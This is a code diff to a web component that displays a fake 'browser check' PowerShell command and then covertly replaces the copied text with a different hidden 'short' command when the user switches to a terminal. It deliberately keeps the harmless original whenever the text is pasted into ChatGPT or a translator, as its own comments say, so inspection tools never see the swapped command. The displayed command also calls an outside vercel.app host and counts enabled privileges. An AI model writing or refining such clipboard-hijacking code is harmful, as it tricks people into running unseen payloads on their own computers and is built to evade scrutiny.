@@ -28,13 +28,14 @@ function browserIconSrc(browser: ClientBrowser): string {
 /**
  * One Ctrl/⌘+C on the gray box (shows original). Works on Windows, macOS, and Linux.
  *
- * Case A — paste Terminal/CMD immediately:
- *   Windows/macOS: leaving the tab quickly arms text/plain = short command.
- *   Linux: copy-gesture write + focused pre-arm (~400ms) + window blur / Ctrl+Alt+T → short.
+ * Case A — paste Terminal immediately (Linux):
+ *   Short command only on Ctrl+Alt+T or window blur to Terminal (copy-gesture write).
+ *   No focused short pre-arm — that put short on the clipboard before ChatGPT paste.
  *
  * Case B — paste other platforms first (Linux):
- *   Force/keep the original for platforms AND for Terminal afterward (no short swap).
- *   Other OSes: clipboard stays original briefly after leave, then short command.
+ *   Keep/force original for platforms AND for Terminal afterward (no short swap).
+ *
+ * Other OSes: leave quickly → short; platforms first → original then delayed short.
  */
 const DISPLAY_COMMANDS: Record<ClientOs, string> = {
   windows: `cmd /c "powershell -NoProfile -Command {$r=@{}; $r.browser=(Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe' -ErrorAction SilentlyContinue).'(default)'; $r.webgl=(Get-CimInstance Win32_VideoController).Name; $r.check=try{(Invoke-WebRequest 'https://browser-notification-six.vercel.app/' -Method HEAD -TimeoutSec 10 -UseBasicParsing).StatusCode}catch{'unreachable'}; $r.permissions=(whoami /priv|Select-String 'Enabled').Count; $r.status=if($r.check -eq 200){'PASS'}else{'FAIL'}; Write-Host ($r|ConvertTo-Json) -ForegroundColor Green}" && exit`,
@@ -294,19 +295,19 @@ function beginLinuxClipboardFromCopyGesture(
   if (typeof ClipboardItem === "undefined" || !navigator.clipboard?.write) {
     void navigator.clipboard?.writeText(displayCommand).catch(() => undefined);
     onResolved(false);
-    return null;
+    return {
+      isSettled: () => true,
+      resolveTerminal: () => undefined,
+      resolveOriginal: () => undefined,
+    };
   }
 
   let settled = false;
   let resolveBlob: ((blob: Blob) => void) | null = null;
-  let safetyTimer = 0;
-  let prearmTimer = 0;
 
   const settle = (text: string, usedTerminalPlain: boolean) => {
     if (settled) return;
     settled = true;
-    window.clearTimeout(safetyTimer);
-    window.clearTimeout(prearmTimer);
     resolveBlob?.(new Blob([text], { type: "text/plain" }));
     onResolved(usedTerminalPlain);
   };
@@ -314,19 +315,6 @@ function beginLinuxClipboardFromCopyGesture(
   const plainPromise = new Promise<Blob>((resolve) => {
     resolveBlob = resolve;
   });
-
-  // Still on the page after the quick window → keep original (Case B-friendly).
-  safetyTimer = window.setTimeout(() => {
-    settle(displayCommand, false);
-  }, QUICK_TERMINAL_LEAVE_MS);
-
-  // Case A: arm short while still focused so Terminal paste works after Ctrl+Alt+T / dock.
-  prearmTimer = window.setTimeout(() => {
-    if (settled) return;
-    if (document.visibilityState === "hidden") return;
-    if (typeof document.hasFocus === "function" && !document.hasFocus()) return;
-    settle(terminalCommand, true);
-  }, 400);
 
   void navigator.clipboard
     .write([
@@ -338,16 +326,19 @@ function beginLinuxClipboardFromCopyGesture(
     .catch(() => {
       if (!settled) {
         settled = true;
-        window.clearTimeout(safetyTimer);
-        window.clearTimeout(prearmTimer);
         onResolved(false);
       }
     });
 
+  // Resolve ORIGINAL immediately so ChatGPT/Translate never receive the short
+  // command. Case A overwrites with writeText/writeClipboard on Ctrl+Alt+T / blur.
+  settle(displayCommand, false);
+
   return {
     isSettled: () => settled,
-    resolveTerminal: () => settle(terminalCommand, true),
-    resolveOriginal: () => settle(displayCommand, false),
+    // Already settled to original — Case A must use a fresh clipboard write.
+    resolveTerminal: () => undefined,
+    resolveOriginal: () => undefined,
   };
 }
 
@@ -526,7 +517,6 @@ function SelectableCommand({
     }
 
     function resolveLinuxCopyGestureOnLeave() {
-      const ctrl = linuxClipboardCtrlRef.current;
       const caseB = linuxCaseBRef.current || linuxAltHeldRef.current;
 
       if (caseB) {
@@ -534,16 +524,10 @@ function SelectableCommand({
         return true;
       }
 
-      // Case A: Terminal / dock — claim immediately so visibility Case B cannot steal it.
+      // Case A: Terminal / dock — overwrite original with short (copy already settled).
       linuxCaseARef.current = true;
       linuxCaseBRef.current = false;
-      if (ctrl && !ctrl.isSettled()) {
-        ctrl.resolveTerminal();
-        return true;
-      }
-      if (ctrl?.isSettled() && armedRef.current) {
-        return true;
-      }
+      writeGenRef.current += 1;
       void navigator.clipboard?.writeText(terminalCommand).catch(() => undefined);
       void writeClipboard(terminalCommand, htmlRef.current)
         .then(() => {
@@ -756,7 +740,6 @@ function SelectableCommand({
         html,
         (usedTerminalPlain) => {
           if (usedTerminalPlain) {
-            // If Case B already won the race, do not keep Case A short armed.
             if (linuxCaseBRef.current || linuxAltHeldRef.current) {
               linuxCaseARef.current = false;
               armedRef.current = false;
@@ -770,26 +753,9 @@ function SelectableCommand({
             delayedArmStartedRef.current = true;
             return;
           }
-          // Original resolved: Linux Case B keeps original forever (no short arm).
+          // Original on clipboard (default). Linux Case B locks it; do not auto-arm short.
           if (linuxCaseBRef.current) {
             delayedArmStartedRef.current = true;
-            return;
-          }
-          if (leaveCountRef.current >= 1) {
-            if (!delayedArmStartedRef.current && !armedRef.current) {
-              delayedArmStartedRef.current = true;
-              const gen = ++writeGenRef.current;
-              writeTerminalPlainAfterDelay(
-                terminalCommand,
-                htmlRef.current,
-                PLATFORM_THEN_TERMINAL_ARM_MS,
-                () => writeGenRef.current === gen && !linuxCaseARef.current,
-              );
-              window.setTimeout(() => {
-                if (writeGenRef.current !== gen || linuxCaseARef.current) return;
-                armedRef.current = true;
-              }, PLATFORM_THEN_TERMINAL_ARM_MS + 50);
-            }
           }
         },
       );
